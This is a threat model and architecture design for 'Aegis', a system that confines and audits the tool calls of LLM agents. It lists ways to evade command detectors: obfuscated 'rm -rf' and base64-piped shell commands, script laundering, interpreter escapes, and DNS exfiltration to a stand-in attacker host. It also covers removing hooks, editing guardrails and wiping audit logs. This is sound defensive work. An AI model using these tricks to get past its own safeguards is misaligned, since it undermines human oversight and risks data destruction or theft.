# Aegis threat model & watertight architecture

> Status: design. This document is adversarial on purpose. It states where the
> current PoC leaks and what the hardened design must do to close each hole.
> A control we cannot defend against a motivated adversary is not a control.

## 0. The central principle

**Do not enumerate badness. Enumerate goodness.** A denylist of dangerous
patterns (the PoC's detectors) can always be evaded, because the space of ways
to express a bad action is unbounded. A watertight system is **default-deny**:
the agent has only the capabilities explicitly granted, runs confined, and
every tool call must pass an allowlist. Confinement is the load-bearing layer;
the policy engine is defense-in-depth, the audit recorder, and the
human-approval router — **not** the only wall.

Corollary: the honest claim is not "the LLM can't do anything bad." It is
**"the LLM cannot exceed the capabilities the control function granted it, and
every attempt is mediated, logged, and — where ambiguous — escalated to a
human."** That is achievable and defensible. "We pattern-match for bad
commands" is neither.

## 1. Assets

- **Confidentiality:** MNPI, client PII, positions/P&L, market data, secrets.
- **Integrity:** production data, code, infra config, the guardrails themselves.
- **Availability:** trading/market-data systems (a runaway query is an outage).
- **Accountability:** a regulator-grade record of what every agent did.

## 2. Adversaries (who/what we defend against)

| # | Adversary | Capability |
|---|---|---|
| A1 | **Compromised / jailbroken model** | emits any tool call it wants |
| A2 | **Prompt-injected model** | follows instructions hidden in data it reads (docs, web, DB rows, tickets) |
| A3 | **Buggy/over-eager model** | well-intentioned but wrong (deletes prod thinking it's scratch) |
| A4 | **Malicious user** driving the agent | tries to use the agent to exfiltrate/destroy and evade the gate |
| A5 | **Insider with repo write** | tries to weaken the guardrails themselves |
| A6 | **Network/data-plane attacker** | controls a source the agent reads |

The model is **untrusted** by design. We assume A1/A2 will happen.

## 3. Trust boundaries

```
 ┌─────────────────────────── UNTRUSTED ──────────────────────────┐
 │  LLM (any provider)  +  agent reasoning  +  tool-call requests  │
 └───────────────────────────────┬─────────────────────────────────┘
                                  │  (the only way out is a tool call)
 ════════════════ TRUST BOUNDARY: the broker ════════════════════════
                                  │
 ┌──────────────── TRUSTED (higher privilege than the agent) ───────┐
 │  Policy Decision Point  ·  signed policy  ·  audit sink          │
 │  Sandbox / capability confinement  ·  egress proxy  ·  query     │
 │  proxy  ·  secret broker                                         │
 └──────────────────────────────────────────────────────────────────┘
```

Everything above the boundary is untrusted. Enforcement must live below it, at
**higher privilege the agent cannot reach**, and the boundary must be the
*only* path from intent to effect.

## 4. Attack classes — and where the PoC stands (honest)

Legend: ✅ closed · ⚠️ partial · ❌ open in current PoC.

### A. Detector evasion — ❌ open
Pattern matching on command strings loses to:
- **Obfuscation:** `r''m -rf /`, `rm${IFS}-rf`, `r\m -rf`, `echo cm0gLXJm | base64 -d | sh`, `eval "$(...)"`, `printf '\x72\x6d'`.
- **Indirection / laundering:** write a benign-looking script in one tool call (no dangerous token), then `bash deploy.sh` in the next — the gate sees only `bash deploy.sh`. **This alone defeats any string denylist.**
- **Interpreter escape:** `python -c "import os,base64;..."`, and crucially `q` itself — `q script.q` runs arbitrary code; `system"rm -rf"`, `hopen`, file reads, sockets. Gating the *launch command* tells you nothing about what the interpreter does.
- **Egress variants:** raw IP, hex/decimal IP, DNS exfil (`nslookup secret.attacker.com`), abusing an allowlisted host as an open redirect, writing to a synced dir.

→ Closed only by **confinement** (no arbitrary binaries, no unproxied network, no write to sensitive paths) + **default-deny command allowlist** + **enforcement at the layer that sees ground truth** (egress proxy sees the real destination; query proxy sees the parsed query). Regex detectors stay as *defense-in-depth signal*, never the wall.

### B. Chokepoint bypass — ⚠️ partial
- **Hook not installed / removed:** the Claude Code hook is opt-in via `.claude/settings.json`. If absent, zero enforcement. (And `.claude/settings.json` is not currently a protected path.)
- **Unknown tools default-allow:** an MCP/custom tool with no matching rule sails through. Must be **default-deny on unknown tools**.
- **Developer forgets to gate a tool** in a platform-API loop: enforcement depends on every dispatch calling `Guard.check`. Must be a **chokepoint by construction** — a single broker that is the *only* execution path; tools are registered behind it, not callable directly.
- **Hook failure → fail-open?** If a PreToolUse hook times out or errors and the host defaults to allow, that's a silent hole. Must be **configured/verified to deny on hook failure** (and the engine already fails closed; the host wiring must too).

### C. Integrity of the guardrails — ⚠️ partial
- PoC `protected_paths` is a *pattern check enforced by the very gate it protects* — circular. Bypassable via absolute path, `../`, symlink, or a tool the matcher doesn't cover. And if the gate is off (B), protection is gone.
- → Watertight: policy, engine, and audit live on a **read-only mount owned by a different uid**; the agent's runtime has no OS-level write capability to them. Not a regex — a filesystem permission. `.claude/settings.json` (or equivalent wiring) likewise read-only.

### D. TOCTOU / semantic gap — ❌ open
The string checked ≠ the behavior executed. `cat $F` (benign at check, `$F=/etc/shadow` set earlier); `cat ./report` where `report` is a symlink to a secret; env/cwd-dependent expansion. → Enforce on **resolved** state, or confine so the gap is harmless (sandbox can't read the secret regardless).

### E. Gate availability / ReDoS — ⚠️
A crafted input could cause catastrophic regex backtracking and hang the gate. If the host has a timeout-allow, DoS → fail-open. → Audit all regexes for linear-time behavior (or run with a watchdog that **fails closed**), bound input size, cap evaluation time → deny on timeout.

### F. Audit destruction — ⚠️ partial
Hash chaining makes edits *detectable*, not *impossible*. The agent could truncate or delete the whole file (chain still "verifies" over nothing). → Stream every decision to an **append-only external sink** (WORM bucket / managed ledger / syslog to a host the agent can't reach); periodically anchor the chain head off-host.

### G. Approval fatigue / over-block — ⚠️ (the sociotechnical failure)
A gate that fires too often gets disabled by the team — the most common real-world failure of security controls. A turned-off gate is 0% effective. → **Monitor mode first** (decide-and-log, don't block) to measure false-positive rate before enforcing; tune; and ensure **only the control function, not the engineer, can disable a pack** (separation of duties).

### What the PoC *does* get right (keep)
Deterministic decisions; fail-closed engine load; severity→effect; most-severe-wins; tamper-*evident* audit; policy-as-data authored by the control function; model-agnostic core; the broker concept (guard.check) — these are the correct primitives. The gap is that they must be wrapped in confinement and OS-level integrity to be watertight.

## 5. The watertight architecture — eight layers

Each layer is independent; a bypass of one is caught by the next (defense in depth).

1. **Confinement (load-bearing).** Agent runs in a sandbox with least
   privilege: read-only FS except a scratch dir; **no direct network** (only an
   egress proxy); no prod credentials in the environment; CPU/mem/time limits;
   no ambient cloud/IAM identity. Makes whole classes impossible, not detected.
2. **Mediated tool access (chokepoint by construction).** The agent cannot
   invoke tools directly. One broker is the sole path; tools are registered
   behind it; the broker calls the PDP for every call. **Default-deny unknown
   tools.**
3. **Default-deny policy (PDP).** Allowlist tools, binaries, hosts, tables —
   not a denylist of bad strings. Deterministic, out-of-process, higher
   privilege than the agent. The PoC engine, run default-deny.
4. **Enforcement at ground truth.** Network rules enforced at the **egress
   proxy** (sees the real destination, terminates TLS, classifies payload, DLP).
   DB rules enforced at a **query proxy** (parses the query, injects row/time
   limits, enforces table allowlists). Secrets via a **broker** that issues
   short-lived scoped tokens and redacts on read — never in the env. Strings
   are signal; these layers are truth.
5. **Integrity & separation of duties (OS-enforced).** Policy is **signed** by
   the control function's key, verified against a **pinned public key** the
   agent can't replace; mounted **read-only** to the agent uid. Engine + audit
   likewise. Disabling a pack requires a new signed bundle — an engineer
   cannot.
6. **Fail-closed, everywhere.** No gate → no action. Hook/broker failure →
   deny. Unknown tool → deny. Eval timeout/ReDoS → deny. Proxy/PDP down → deny.
   Missing/invalid/forged policy → deny (already in the engine).
7. **Immutable audit.** Hash-chained locally **and** streamed to an append-only
   external sink; secrets masked before write; chain head anchored off-host.
   Every *proposed* and *decided* action, with principal.
8. **Assurance.** A red-team evasion corpus (every trick in §4.A) run in CI as
   the acceptance test; monitor-mode rollout to measure FP before enforcing;
   published catch-rate / FP metrics per rule; periodic adversarial review.

## 6. Defense-in-depth matrix

| Attack | L1 sandbox | L2 broker | L3 PDP | L4 ground-truth | L5 integrity | L7 audit |
|---|:--:|:--:|:--:|:--:|:--:|:--:|
| exfil via obfuscated curl | ✅ (no net) | — | ⚠️ | ✅ (proxy) | — | ✅ |
| script-laundering | ✅ (no binaries) | ✅ (allowlist) | ✅ | — | — | ✅ |
| interpreter escape (q/python) | ✅ (confined) | — | ⚠️ | ✅ (query proxy) | — | ✅ |
| edit the guardrails | — | — | ⚠️ | — | ✅ (RO mount) | ✅ |
| remove the hook | ✅ (broker is sole path) | ✅ | — | — | ✅ | ✅ |
| audit tampering | — | — | — | — | ✅ | ✅ (WORM) |
| runaway query | ⚠️ (rlimit) | — | ✅ | ✅ (query proxy) | — | ✅ |

No single column is fully green across the row — that's the point. **No single
layer is trusted to be watertight; the stack is.**

## 7. Open decisions (drive the build)

1. **Execution substrate** — where do agents run? (containers/K8s, microVMs/
   gVisor, dev laptops). L1 confinement is only as strong as this, and it
   dictates everything. *On a dev laptop you cannot fully sandbox; there the
   honest posture is "strong defense-in-depth, not watertight" — worth being
   explicit with the bank about which surfaces get which guarantee.*
2. **PDP placement** — in-process library (fast, but agent-tamperable) vs
   out-of-process sidecar/service (watertight, more infra). Watertight ⇒
   out-of-process.
3. **Posture per surface** — default-deny allowlist (secure, more friction) vs
   monitored denylist (friendlier, porous). Recommend default-deny for
   operational/prod surfaces, monitored for low-risk dev surfaces.
4. **Network & data plane** — is there appetite to route agent traffic through
   an egress proxy and DB queries through a query proxy? These are where
   exfil/runaway-query controls become real rather than best-effort.

## 8. What stays out of scope (and must be said)

Aegis governs **agent actions**. It does not make the model truthful, does not
stop the model from *recommending* something bad in text, and does not replace
the bank's existing IAM, DLP, or change-control — it composes with them. Claims
beyond "mediates and confines agent actions, fail-closed, fully audited" are
overclaims and must not appear in the pitch.
